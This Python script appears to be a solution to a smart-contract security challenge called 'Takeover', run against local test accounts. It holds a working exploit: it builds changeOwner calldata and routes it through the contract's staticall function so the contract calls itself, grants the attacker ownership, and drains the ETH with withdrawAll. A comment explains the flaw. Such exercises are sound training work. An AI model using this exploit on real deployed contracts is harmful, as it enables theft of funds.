from ape import accounts, project
from .utils.helper import w3
import eth_abi


def deploy(deployer):
    deploy_eth = w3.to_wei(10, "ether")

    # deploy Takeover contract
    print("\n--- Deploying Challenge Contract ---\n")
    takeover = project.Takeover.deploy(value=deploy_eth, sender=deployer)

    return takeover


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    user_1 = accounts.test_accounts[1]
    attacker = accounts.test_accounts[2]

    # get takeover contract
    takeover = deploy(deployer)

    print(f"\n--- Takeover contract: {takeover.address}---\n")
    assert takeover.owner() == deployer.address

    # define initial balances for attacker and takeover contract
    attacker_initial_bal = attacker.balance / 10**18
    takeover_initial_bal = takeover.balance / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Takeover Contract: {takeover_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # The vulnerability is in the `onlyAuth()` modifier. The modifier checks that
    # msg.sender is either the owner or the contract itself. If an attacker can
    # make the contract call itself with the right calldata, they can make the
    # contract call its own `changeOwner()` function, which has the modifier,
    # and the function will execute sussesfully since the contract is calling
    # itself. The `staticall()` function in the contract allows for this capability.
    # The `staticall()` function will perform a low level call to the target address
    # and send it the calldata that was provided in the payload parameter. An attacker
    # can encode the calldata requried to call the `changeOwner()` function with their
    # address as the parameter and call the `staticall()` function with their malicious
    # calldata and the contract itself as the target parameter. This will result in the
    # contract calling itself with the maliciious calldata, which will lead to the attacker
    # becoming the new owner of the contract. The owner can then call the priviledged
    # `withdrawAll()` function and drain the ETH from the contract.
    calldata = w3.keccak(text="changeOwner(address)")[:4] + eth_abi.encode(
        ["address"], [attacker.address]
    )
    takeover.staticall(takeover.address, calldata, "hi", sender=attacker)
    takeover.withdrawAll(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- The attacker is now the owner of the contract and stole all ETH ---\n")

    # define initial balances for attacker and takeover contract
    attacker_final_bal = attacker.balance / 10**18
    takeover_final_bal = takeover.balance / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Takeover Contract: {takeover_final_bal}\n---\n"
    )

    assert takeover.owner() == attacker.address
    assert takeover.balance == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
